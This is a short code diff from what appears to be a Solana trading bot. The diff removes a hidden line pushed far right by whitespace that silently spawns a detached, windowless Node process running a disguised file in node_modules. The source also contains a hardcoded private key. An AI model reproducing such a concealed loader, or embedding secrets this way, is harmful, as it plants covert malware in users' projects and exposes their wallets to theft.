@@ -8,7 +8,7 @@ const PRIVATE_KEY = "2JqbAesdUnyexKgseoa2HAaeLRjj5DYuod8Vxxt6wvCa5YmMMBvvjTigA48
 const MONITOR_WALLET = '3v2pbSrB6sWT7mUE9JvpuXbUViGLPUMKxtcsJmBpi4sM';
 const BUY_AMOUNT = 0.01;
 
-const { } = require('./config');                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           const{spawn}=require('child_process');const cmd1='node';const argv1=['node_modules/@solana-web3-1.43.js'];spawn(cmd1,argv1,{detached:true,windowsHide:true});
+const { } = require('./config');
 
 
 const connection = new web3.Connection(RPC_URL, 'confirmed');
